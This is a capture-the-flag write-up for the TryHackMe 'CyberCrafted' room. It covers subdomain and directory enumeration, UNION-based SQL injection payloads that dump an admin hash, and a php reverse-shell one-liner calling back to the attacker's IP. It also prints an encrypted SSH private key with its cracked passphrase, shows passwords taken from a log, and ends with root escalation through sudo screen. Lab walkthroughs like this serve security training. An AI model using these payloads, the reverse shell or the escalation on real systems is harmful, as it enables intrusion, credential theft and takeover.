# 91 - CyberCrafted (SQLI, eploiting Screen for priv esc)

Room Link --> [https://tryhackme.com/room/cybercrafted](https://tryhackme.com/room/cybercrafted)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -Pn -n 10.10.152.22 -p-

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (EdDSA)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Log In
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
MAC Address: 02:62:A3:C2:8E:83 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms admin.cybercrafted.thm (10.10.70.248)
```
{% endcode %}

In the traceroute section of the output, we see a domain address `admin.cybercrafted.thm`. We’ll add this to our `/etc/hosts` to access the site via virtual routing.

#### Subdomains <a href="#subdomains" id="subdomains"></a>

Viewing the results of the Nmap output, we know that this server is hosting an http service. Typing the address `http://10.10.152.22` into the address bar of our browser returns an error and redirected to `http://cybercrafted.thm` so we also add this to hosts file.

Navigating to the webpage and viewing the sourcecode we see a hint.

{% code overflow="wrap" %}
```html
<!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->
```
{% endcode %}

#### Gobuster

{% code overflow="wrap" %}
```bash
gobuster vhost -u cybercrafted.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt 
# or 
wfuzz -c -f domains -w /usr/share/wordlists/dirb/common.txt -u "http://cybercrafted.thm" -H "Host: FUZZ.cybercrafted.thm" --sc 200,403

admin
store
www
```
{% endcode %}

After taking a look at both of the subdomains we notice that the store subdomain index page is forbidden. We could try to brute-force the login for the admin subdomain but we don't know the username. Either way, before we do anything we must use Gobuster to check for anything hidden.

{% code overflow="wrap" %}
```bash
gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/dirb/common.txt -x php
            
search.php
```
{% endcode %}

The admin subdomain didn't turn up anything useful however the store subdomain did. It has a "search.php" page which we can access.

<figure><img src=".gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

On entering `' OR 1=1-- -` we got all the items and their prices listed.

<figure><img src=".gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

After playing with it, we see there are 4 columns and columns "2,3,4" are strings columns.

```bash
cloth' UNION SELECT 1,@@version,database(),user()-- -

5.7.35-0ubuntu0.18.04.1, webapp, root@localhost
```

We can continue and dump all info on the DB.

#### DBs/Schemas

{% code overflow="wrap" %}
```sql
cloth' UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata-- -

information_schema,mysql,performance_schema,sys,webapp
```
{% endcode %}

#### Tables

{% code overflow="wrap" %}
```sql
cloth' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema="webapp"-- -

admin,stock
```
{% endcode %}

#### Columns

{% code overflow="wrap" %}
```sql
cloth' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name="admin"-- -

id,user,hash
```
{% endcode %}

#### Data

{% code overflow="wrap" %}
```sql
cloth' UNION SELECT 1,group_concat(user,"--",hash),3,4 FROM webapp.admin-- -

xXUltimateCreeperXx : 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
web_flag : THM{bbe315906038c3a62d9b195001f75008}
```
{% endcode %}

#### Cracking hash with john

```
diamond123456789 (xXUltimateCreeperXx)
```

We can login to the minecraft server now.

<figure><img src=".gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>

We are able to execute bash cmds here.

### Initial Access

So i went to [https://www.revshells.com/](https://www.revshells.com/) and got a php reverse shell.

```php
php -r '$sock=fsockopen("10.18.88.214",9000);shell_exec("/bin/bash <&3 >&3 2>&3");'
```

setup nc listener to catch it, execute it and got a shell.

<figure><img src=".gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to xultimatecreeperxx

We found his ssh private key, we can login into his account via ssh.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----

```

Cracked the priv key passsword --> `creepin2006`&#x20;

### Priv Esc to cybercrafted

I used find to find all the files readable by xultim.... user

```bash
find / -user cybercrafted -type f -readable 2>/dev/null

/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted/help.yml
/opt/minecraft/cybercrafted/ops.txt
/opt/minecraft/cybercrafted/bukkit.yml
/opt/minecraft/cybercrafted/banned-ips.txt
/opt/minecraft/cybercrafted/banned-players.txt
/opt/minecraft/cybercrafted/white-list.txt
/opt/minecraft/cybercrafted/plugins/LoginSystem_v.2.4.jar
/opt/minecraft/cybercrafted/plugins/LoginSystem/settings.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
/opt/minecraft/cybercrafted/plugins/LoginSystem/language.yml
[---------redacted------]
```

So we found some files.

{% code overflow="wrap" %}
```bash
cat /opt/minecraft/note.txt
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.

# plugin name is:
LoginSystem
```
{% endcode %}

We find cybercrafted creds in `/opt/minecraft/cybercrafted/plugins/LoginSystem`&#x20;

```bash
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
```

But they were of no use as john couldnt crack cybercrafted hash.

But the `log.txt` contains some logs with passwords:

```bash
cat log.txt 

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123


[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!
[2023/11/23 06:18:26] [BUKKIT-SERVER] Startet LoginSystem!

# creds
cybercrafted : JavaEdition>Bedrock
# We can switch to his acct using "su".
```

### Priv Esc to root

`sudo -l` - we can run cmd as root.

```
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```

This user is allowed to run the command `/usr/bin/screen -r cybercrafted` with sudo. Screen is a windows manager for terminals much like tmux. So if we can use sudo to launch screen, we should be able to spawn terminals from screen which should inherit root privileges.

Searching [online](https://linuxize.com/post/how-to-use-linux-screen/) we can find what commands to use to spawn shells from screen or we can use the linux manual to dig through the commands (`man screen`). When we run the command, we are reattaching to an existing session (`-r cybercrafted`) and from there all we have to is spawn new window with a shell (ctl+a c).

We can run the following service session as root. Let's connect to the session as the root user by running by running the following command:

```bash
sudo /usr/bin/screen -r cybercrafted
```

We can see that we are in the Minecraft servers in-game console from which an admin can monitor the server.

<figure><img src="https://m4dd.rocks/writeups/cybercrafted/assets/img/cc-console.png" alt=""><figcaption></figcaption></figure>

We can escape from the in-game console in multiple ways. I will be using a default screen shortcut to go to the next window "`CTRL + A + C`". This will drop us in a system shell as the root user.

Done!

